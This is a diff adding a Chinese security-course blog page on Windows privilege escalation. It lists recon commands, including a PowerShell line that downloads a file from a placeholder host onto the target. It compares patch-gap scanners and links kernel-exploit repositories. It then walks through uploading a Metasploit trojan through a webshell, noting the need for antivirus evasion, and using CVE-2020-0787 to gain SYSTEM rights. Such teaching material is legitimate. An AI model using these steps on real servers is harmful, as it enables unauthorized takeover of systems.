@@ -1,0 +1,349 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权 | HVVL404</title><meta name="author" content="HVVL404"><meta name="copyright" content="HVVL404"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权">
+<meta property="og:url" content="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.hvvl404.fun/images/avatar.png">
+<meta property="article:published_time" content="2023-06-05T14:47:18.052Z">
+<meta property="article:modified_time" content="2023-06-05T14:47:18.052Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.hvvl404.fun/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '59：权限提升-Win溢出漏洞及AT&SC&PS提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-06-05 22:47:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css?1"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-05T14:47:18.052Z" title="发表于 2023-06-05 22:47:18">2023-06-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T14:47:18.052Z" title="更新于 2023-06-05 22:47:18">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/">小迪安全（权限提升）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</p>
+<span id="more"></span>
+
+<p>思维导图</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-1.png" alt="59-1"></p>
+<p>明确权限提升基础知识：权限划分</p>
+<p>明确权限提升环境问题：web及本地</p>
+<ul>
+<li>web提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。</li>
+<li>本地提权：已有服务器普通用户权限，想要获得root权限。</li>
+</ul>
+<p>明确权限提升方法针对：针对方法适应问题</p>
+<p>明确权限提升针对版本：个人及服务器版本;针对方法；</p>
+<p>知识点必备：</p>
+<ul>
+<li>用户及用户组权限划分；Windows提权命令</li>
+</ul>
+<p><strong>windows权限认识(用户及用户组)</strong></p>
+<p>Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。</p>
+<p><strong>0x01 普通权限</strong></p>
+<p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup  Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p>
+<p>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。　　</p>
+<p><strong>0x02特殊权限</strong></p>
+<p>　　除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>　　真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>　　“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br>　　被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>　　但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>　　无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/89063095">https://blog.csdn.net/qq_17204441/article/details/89063095</a></p>
+<p><strong>Windows提权命令：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">命令                          //描述</span><br><span class="line">systeminfo  　　　　　　　　//打印系统信息</span><br><span class="line">whoami      　　　　　　　　//获得当前用户名</span><br><span class="line">whoami /priv    　　　　　　//当前账户权限</span><br><span class="line">ipconfig        　　　　　  //网络配置信息</span><br><span class="line">ipconfig /displaydns        //显示DNS缓存</span><br><span class="line">route print                 //打印出路由表</span><br><span class="line">arp -a                      //打印arp表</span><br><span class="line">hostname                    //主机名</span><br><span class="line">net user                    //列出用户</span><br><span class="line">net user UserName           //关于用户的信息</span><br><span class="line">net user \SMBPATH Pa$$w0rd /u:UserName      //连接SMB</span><br><span class="line">net localgroup              //列出所有组</span><br><span class="line">net localgroup GROUP        //关于指定组的信息</span><br><span class="line">net view \127.0.0.1         //会话打开到当前计算机</span><br><span class="line">net session                 //开发给其他机器</span><br><span class="line">netsh firewall show config  //显示防火墙配置</span><br><span class="line">DRIVERQUERY             　　//列出安装的驱动</span><br><span class="line">tasklist /svc               //列出服务任务</span><br><span class="line">net start                   //列出启动的服务</span><br><span class="line">dir /s foo                  //在目录中搜索包含指定字符的项</span><br><span class="line">dir /s foo == bar           //同上</span><br><span class="line">sc query                    //列出所有服务</span><br><span class="line">sc qc ServiceName           //找到指定服务的路径</span><br><span class="line">shutdown /r /t 0            //立即重启</span><br><span class="line">type file.txt               //打印出内容</span><br><span class="line">icacls &quot;C:\Example&quot;         //列出权限</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn  //列出已安装的补丁</span><br><span class="line">(New-Object System.Net.WebClient) .DownloadFile(&quot;http://host/file&quot;.&quot;C:\LocalPath&quot;)　//利用ps远程下载文件到本地</span><br><span class="line">accesschk.exe -qwsu &quot;Group&quot;         //修改对象（尝试Everyone，Authenticated Users和/或Users）</span><br></pre></td></tr></table></figure>
+
+<p><strong>案例1：基于Web环境下的权限提升-阿里云靶机（Windows2012）</strong></p>
+<p>知识点：</p>
+<ul>
+<li>如何判断使用哪种溢出漏洞？漏洞哪里找？</li>
+<li>信息收集-补丁筛选-利用MSF或特定EXP-执行-西瓜到手</li>
+<li>Vulmap，Wes，WindowsVulnScan对比，exp在哪里获取？</li>
+<li>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？</li>
+</ul>
+<p><strong>1、信息收集</strong></p>
+<p>可以采用一些cmd命令，收集系统信息。比如</p>
+<ul>
+<li>whoami：获得当前用户名</li>
+<li>whoami &#x2F;priv：当前账户权限</li>
+<li>systeminfo：查看系统打了哪些补丁</li>
+<li>net user：列出用户</li>
+<li>net user UserName：查看关于用户的信息</li>
+<li>net localgroup：列出所有组</li>
+<li>等等</li>
+</ul>
+<p><strong>2、补丁筛选</strong></p>
+<p>Vulmap，Wes，WindowsVulnScan三种方法对比：</p>
+<p>方法1：Vulmap</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
+<p>Vulmap是开源的在线本地漏洞扫描器项目。Vulmap需要在PS窗口运行，因此它只适用本地环境，不适用web环境。适用于 Windows 和 Linux 操作系统漏洞。但是它对Windows系统不太友好，更适配Linux系统。比如，下面在阿里云服务器测试，未检测出漏洞。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-2.png" alt="59-2"></p>
+<p>方法2：WES-NG</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p>WES-NG是一种基于 Windows systeminfo 实用程序输出的工具，它提供操作系统易受攻击的漏洞列表，包括对这些漏洞的任何利用。适用于 Windows 操作系统。</p>
+<p>wes.py 既适用本地环境，也适用web环境。因为它只需要我们在目标服务器执行systeminfo &gt; 1.txt命令，拿到系统信息（主要是补丁信息）即可，然后我们可以把信息保存在 1.txt文件中，在本机运行wes.py进行测试即可。</p>
+<p>下面命令会把漏洞详情保存在vuln.csv文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标服务器执行命令：systeminfo &gt; 1.txt</span><br><span class="line">本机执行命令：python wes.py 1.txt -o vuln.csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-3.png" alt="59-3"></p>
+<p>打开 vuln.csv查看详情</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-4.png" alt="59-4"></p>
+<p>方法3：WindowsVulnScan</p>
+<p>地址：<a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>WindowsVulnScan根据软件的名称和版本号来确定是否有 CVE 和公开的 EXP。适用于 Windows 操作系统。</p>
+<p>WindowsVulnScan 前期收集补丁信息时也需要在PS窗口运行，因此只适用于本地环境。但是我们也可以对其进行一些小的修改，让它可以用于web环境。所以也可以说它是一个通用方法。</p>
+<p>比如第一步运行KBCollect.ps1收集补丁信息，会自动创建KB.json文件。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-5.png" alt="59-5"></p>
+<p>打开KB.json文件，我们看到其实这就是一些补丁信息，我们可以直接用systeminfo命令代替，然后将收集到的信息按照KB.json格式重新排列一下即可。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-6.png" alt="59-6"></p>
+<p>然后运行如下命令得到exp信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-check.py -C -f KB.json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-7.png" alt="59-7"></p>
+<p><strong>3、利用MSF或特定EXP提权</strong></p>
+<p>利用上述3种方法之一找出可利用的漏洞之后，我们可以利用msf或者特定exp进行测试。</p>
+<p>首选msf工具，但是msf工具是隔一段时间更新一版，因此msf中的漏洞可能更新不及时，如果遇到了msf没有收录的漏洞，我们可以网上搜索特定的exp测试，比如GitHub上有人整理了很多exp，可以搜索一下。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></li>
+</ul>
+<p><strong>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？</strong></p>
+<ul>
+<li>若要在实战中使用msf，最好买台服务器，不需要配置太好，2核4G即可，linux操作系统（Ubuntu更兼容），只安装msf，使用时用xshell连接即可。</li>
+<li>云服务器上安装MSF环境：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/M0rta1s/p/11920903.html">https://www.cnblogs.com/M0rta1s/p/11920903.html</a></li>
+</ul>
+<p>msf提权演示案例：</p>
+<p> &lt;1&gt;生成一个木马 exe文件</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-8.png" alt="59-8"></p>
+<p>&lt;2&gt;通过webshell上传这个test.exe文件到服务器（test.exe可能会被服务器上的waf识别，所以实战中需要免杀）</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-9.png" alt="59-9"></p>
+<p>&lt;3&gt;启动msf</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-10.png" alt="59-10"></p>
+<p>&lt;4&gt;msf监听5566端口</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-11.png" alt="59-11"></p>
+<p>&lt;5&gt;通过webshell执行这个test.exe文件</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-12.png" alt="59-12"></p>
+<p>&lt;6&gt;监听到会话，如上上图所示（注意：阿里云服务器安全组默认没有开5566端口，所以我们需要手动打开）</p>
+<p>&lt;7&gt;查看，拿到服务器的web权限</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-13.png" alt="59-13"></p>
+<p>&lt;8&gt;接下来，我们需要进行web提权，搜索一个2016年的exp</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-14.png" alt="59-14"></p>
+<p>&lt;9&gt;使用这个exp</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-15.png" alt="59-15"></p>
+<p>&lt;10&gt;show options</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-16.png" alt="59-16"></p>
+<p>&lt;11&gt;修改设置</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-17.png" alt="59-17"></p>
+<p>&lt;12&gt;重新show options，显示修改成功</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-18.png" alt="59-18"></p>
+<p>&lt;13&gt;继续修改设置，利用，成功获取到system权限，提权成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-19.png" alt="59-19"></p>
+<p><strong>案例2：基于本地环境下的权限提升-系统溢出漏洞</strong></p>
+<p>使用特定EXP演示案例：</p>
+<p>&lt;1&gt;whoami查看用户身份为普通用户</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-20.png" alt="59-20"></p>
+<p>&lt;2&gt;利用CVE-2020-0787本地提权漏洞，在目标服务器执行BitsArbitraryFileMoveExploit.exe文件</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1</a></li>
+</ul>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-21.png" alt="59-21"></p>
+<p>&lt;3&gt;弹出cmd窗口，运行whoami，发现已经取得了system权限</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-22.png" alt="59-22"></p>
+<p><strong>案例3：基于本地环境下的权限提升-AT&amp;SC&amp;PS命令</strong></p>
+<p>AT&amp;SC&amp;PS命令适用环境？–&gt;AT&amp;SC&amp;PS提权在内网使用比较多</p>
